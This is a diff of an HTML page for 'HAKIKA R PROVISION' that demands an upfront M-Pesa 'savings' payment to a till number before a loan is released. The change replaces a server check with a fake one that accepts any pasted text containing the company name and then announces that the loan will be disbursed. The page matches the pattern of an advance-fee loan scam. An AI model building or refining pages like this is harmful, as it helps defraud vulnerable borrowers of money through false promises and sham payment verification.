@@ -3,188 +3,151 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Account Verification</title>
+  <title>Verify Payment</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #cc2b5e, #753a88);
       margin: 0;
       padding: 20px;
-      background: linear-gradient(135deg, #ff5f6d, #ffc371);
-      color: #000;
-    }
-
-    .container {
-      max-width: 500px;
-      margin: auto;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
     .card {
-      background: #2c003e;
-      color: #fff;
-      border-radius: 16px;
+      background-color: #1e1e2f;
+      border-radius: 12px;
       padding: 20px;
-      margin-bottom: 20px;
-    }
-
-    .card h2 {
-      color: #b2ff59;
-      font-size: 1.3rem;
-      margin-bottom: 10px;
-      text-align: center;
-    }
-
-    .card p {
-      font-size: 0.95rem;
-      line-height: 1.5;
-    }
-
-    .button {
-      display: block;
+      max-width: 400px;
       width: 100%;
+      margin-top: 20px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+    }
+
+    h2 {
+      color: #aaff00;
       text-align: center;
-      background: linear-gradient(to right, #f85032, #e73827);
-      color: white;
-      padding: 12px;
-      font-weight: bold;
-      font-size: 1rem;
-      border: none;
-      border-radius: 12px;
-      margin-top: 15px;
-      cursor: pointer;
-      transition: 0.3s;
     }
 
-    .button:hover {
-      opacity: 0.9;
-    }
-
-    .change-plan {
-      background: linear-gradient(to right, #232526, #414345);
-      color: orange;
-      padding: 10px 20px;
-      border-radius: 24px;
-      text-align: center;
-      margin: 0 auto 20px;
-      display: block;
-      width: fit-content;
-      font-weight: bold;
-    }
-
-    .payment-box {
-      background: #f0f8ff;
-      padding: 15px;
-      border-radius: 12px;
-      font-size: 1rem;
-    }
-
-    .payment-box p {
-      margin: 10px 0;
+    p, li {
+      line-height: 1.6;
     }
 
     .highlight {
       font-weight: bold;
-      color: #000;
+      color: #ffd700;
+    }
+
+    .btn {
+      background: linear-gradient(to right, #ff416c, #ff4b2b);
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 1rem;
+      margin-top: 20px;
+      width: 100%;
+    }
+
+    .btn:hover {
+      background: linear-gradient(to right, #ff4b2b, #ff416c);
     }
 
     .copy-btn {
-      display: inline-block;
-      margin: 10px 0;
-      padding: 10px;
-      background: linear-gradient(to right, #f857a6, #ff5858);
-      color: white;
-      font-weight: bold;
-      border-radius: 10px;
+      margin-top: 10px;
+      background: linear-gradient(to right, #ff9966, #ff5e62);
+    }
+
+    textarea {
+      width: 100%;
+      height: 100px;
+      margin-top: 15px;
+      border-radius: 8px;
       border: none;
-      cursor: pointer;
+      padding: 10px;
+      font-size: 0.95rem;
     }
 
     .footer {
-      text-align: center;
       margin-top: 30px;
-      font-size: 0.8rem;
-      color: #333;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #ccc;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 15px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="card">
-      <h2>ACCOUNT SAVINGS</h2>
-      <p>
-        Based on your selected loan amount of <strong id="loanAmount">Ksh 0.00</strong>, HAKIKA R PROVISION requires you to save
-        <strong id="savingsAmount">Ksh 0.00</strong> (Selected Savings Plan) to your Hakika account.
-        This helps strengthen your credit profile. Your savings will be withdrawable exclusively
-        upon successful completion of your first loan repayment cycle.
-      </p>
+  <h2>ACCOUNT SAVINGS</h2>
+  <div class="card">
+    <p>
+      Based on your selected loan amount of <span class="highlight" id="loanAmount">Ksh ...</span>, HAKIKA R PROVISION requires you to save
+      <span class="highlight" id="savingAmount">Ksh 250.00</span> to your account. This strengthens your credit profile.
+      Savings are withdrawable after successful loan repayment.
+    </p>
+
+    <button class="btn" onclick="changePlan()">Change Savings Plan</button>
+
+    <div style="background:#e8f0fa; color:#000; border-radius:12px; padding:15px; margin-top:20px;">
+      <p><strong>How to save to your HAKIKA A/C:</strong></p>
+      <ul style="list-style:none; padding-left:0;">
+        <li>Go to M~Pesa: <strong>M~pesa</strong></li>
+        <li>Lipa na M~Pesa: <strong>Buy Goods & Services</strong></li>
+        <li>Enter Till Number: <strong id="tillNumber">9824375</strong></li>
+        <li>
+          <button class="btn copy-btn" onclick="copyTill()">CLICK TO COPY TILL</button>
+        </li>
+        <li>Enter Amount: <strong id="savingAmount2">Ksh 250.00</strong></li>
+        <li>Complete Payment: <strong>Enter M~Pesa Pin</strong></li>
+      </ul>
     </div>
 
-    <div class="change-plan">Change Savings Plan</div>
+    <label for="mpesaMessage"><strong>Paste M-Pesa Payment Message:</strong></label>
+    <textarea id="mpesaMessage" placeholder="Paste your M-Pesa message here..."></textarea>
 
-    <div class="payment-box">
-      <p><strong>How to save to your Hakika A/C:</strong></p>
-      <p>Go to M~Pesa: <span class="highlight">M~pesa</span></p>
-      <p>Lipa na M~Pesa: <span class="highlight">Buy Goods & Services</span></p>
-      <p>Enter Till Number: <span class="highlight" id="tillNumber">9824375</span></p>
-
-      <button class="copy-btn" onclick="copyTill()">CLICK TO COPY TILL</button>
-
-      <p>Enter Amount: <span class="highlight" id="displayAmount">Ksh 0.00</span></p>
-      <p>Complete Payment: <span class="highlight">Enter M~Pesa Pin</span></p>
-
-      <button class="button" onclick="verifyPayment()">Verify Payment to Initiate Loan Disbursement</button>
-    </div>
-
-    <div class="footer">© HAKIKA R PROVISION 2025</div>
+    <button class="btn" onclick="verifyPayment()">Verify Payment to Initiate Loan Disbursement</button>
   </div>
 
+  <div class="footer">© Hakika Loans 2025</div>
+
   <script>
-    function calculateSavings(loan) {
-      if (loan < 2000) return 100;
-      else if (loan < 5000) return 250;
-      else return 500;
-    }
+    // Get values from localStorage
+    const loanAmount = localStorage.getItem("loanAmount") || 4790;
+    const savingsAmount = 250;
 
-    const loan = parseInt(localStorage.getItem("loanAmount")) || 0;
-    const savings = calculateSavings(loan);
-
-    document.getElementById("loanAmount").textContent = `Ksh ${loan.toLocaleString()}`;
-    document.getElementById("savingsAmount").textContent = `Ksh ${savings.toLocaleString()}`;
-    document.getElementById("displayAmount").textContent = `Ksh ${savings.toLocaleString()}`;
+    document.getElementById("loanAmount").textContent = "Ksh " + Number(loanAmount).toLocaleString();
+    document.getElementById("savingAmount").textContent = "Ksh " + savingsAmount.toFixed(2);
+    document.getElementById("savingAmount2").textContent = "Ksh " + savingsAmount.toFixed(2);
 
     function copyTill() {
-      const till = document.getElementById("tillNumber").textContent;
+      const till = document.getElementById("tillNumber").innerText;
       navigator.clipboard.writeText(till).then(() => {
-        alert("Till number copied!");
+        alert("Till number copied: " + till);
       });
     }
 
-    function verifyPayment() {
-      const phone = prompt("Enter your M-Pesa number for verification:");
-      if (!phone || phone.length < 10) {
-        alert("Invalid phone number");
-        return;
-      }
+    function changePlan() {
+      alert("Savings plan change feature coming soon.");
+    }
 
-      fetch("https://your-mpesa-api-endpoint.com/verify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          phone,
-          amount: savings,
-          till: "9824375"
-        })
-      })
-        .then(res => res.json())
-        .then(data => {
-          if (data.success) {
-            window.location.href = "success.html";
-          } else {
-            alert("Payment not found. Please try again later.");
-          }
-        })
-        .catch(err => {
-          alert("Error verifying payment. Please try again later.");
-        });
+    function verifyPayment() {
+      const message = document.getElementById("mpesaMessage").value.toUpperCase();
+      if (message.includes("HAKIKA R PROVISION")) {
+        alert("✅ Payment verified successfully! Your loan will be disbursed shortly.");
+        // Optionally redirect or mark status as complete
+        // window.location.href = "success.html";
+      } else {
+        alert("❌ Payment verification failed. Please make sure the payment was sent to HAKIKA R PROVISION.");
+      }
     }
   </script>
 </body>
